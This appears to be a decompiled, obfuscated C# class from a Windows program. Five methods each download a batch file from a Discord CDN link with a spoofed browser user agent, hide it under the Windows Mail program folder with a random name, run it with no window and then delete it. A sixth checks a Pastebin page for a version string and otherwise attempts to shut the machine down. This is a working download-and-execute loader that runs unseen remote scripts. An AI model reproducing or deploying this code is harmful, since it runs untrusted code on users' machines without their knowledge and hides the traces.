using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

internal class Class20
{
	public static void smethod_0()
	{
		_003CModule_003E.Class0.smethod_0();
		WebClient webClient = new WebClient();
		webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/661208670897438731/718630836647231548/Registry.bat", "C:\\Program Files\\Windows Mail\\froe09a0d.bat");
		webClient.Proxy = null;
		Process process = new Process();
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.RedirectStandardInput = true;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.FileName = "C:\\Program Files\\Windows Mail\\froe09a0d.bat";
		process.Start();
		process.WaitForExit();
		File.Delete("C:\\Program Files\\Windows Mail\\froe09a0d.bat");
	}

	public static void smethod_1()
	{
		_003CModule_003E.Class0.smethod_0();
		WebClient webClient = new WebClient();
		webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/661208670897438731/718630987051040788/FN.bat", "C:\\Program Files\\Windows Mail\\fasl913201.bat");
		webClient.Proxy = null;
		Process process = new Process();
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.RedirectStandardInput = true;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.FileName = "C:\\Program Files\\Windows Mail\\fasl913201.bat";
		process.Start();
		process.WaitForExit();
		File.Delete("C:\\Program Files\\Windows Mail\\fasl913201.bat");
	}

	public static void smethod_2()
	{
		_003CModule_003E.Class0.smethod_0();
		WebClient webClient = new WebClient();
		webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/614402516381204485/616362052130308120/a1xUmsOxz.bat", "C:\\Program Files\\Windows Mail\\a1xUmsOxz.bat");
		webClient.Proxy = null;
		Process process = new Process();
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.RedirectStandardInput = true;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.FileName = "C:\\Program Files\\Windows Mail\\a1xUmsOxz.bat";
		process.Start();
		process.WaitForExit();
		File.Delete("C:\\Program Files\\Windows Mail\\a1xUmsOxz.bat");
	}

	public static void smethod_3()
	{
		_003CModule_003E.Class0.smethod_0();
		WebClient webClient = new WebClient();
		webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/661208670897438731/718630903374676111/Cleaner.bat", "C:\\Program Files\\Windows Mail\\fade913201.bat");
		webClient.Proxy = null;
		Process process = new Process();
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.RedirectStandardInput = true;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.FileName = "C:\\Program Files\\Windows Mail\\fade913201.bat";
		process.Start();
		process.WaitForExit();
		File.Delete("C:\\Program Files\\Windows Mail\\fade913201.bat");
	}

	public static void smethod_4()
	{
		_003CModule_003E.Class0.smethod_0();
		WebClient webClient = new WebClient();
		webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
		webClient.DownloadFile("https://cdn.discordapp.com/attachments/661208670897438731/718631086271365140/F6.bat", "C:\\Program Files\\Windows Mail\\fasd913201.bat");
		webClient.Proxy = null;
		Process process = new Process();
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.RedirectStandardInput = true;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.FileName = "C:\\Program Files\\Windows Mail\\fasd913201.bat";
		process.Start();
		process.WaitForExit();
		File.Delete("C:\\Program Files\\Windows Mail\\fasd913201.bat");
	}

	public static void smethod_5()
	{
		_003CModule_003E.Class0.smethod_0();
		WebClient webClient = new WebClient();
		if (!webClient.DownloadString("https://pastebin.com/raw/LkyXs9fL").Contains("v1.1.8"))
		{
			Console.ForegroundColor = ConsoleColor.Red;
			Process.Start("shutdown", "s/ /t 0");
			Thread.Sleep(4000);
			Environment.Exit(0);
		}
		else
		{
			Console.ForegroundColor = ConsoleColor.Green;
		}
	}

	public Class20()
	{
		_003CModule_003E.Class0.smethod_0();
		base._002Ector();
	}
}
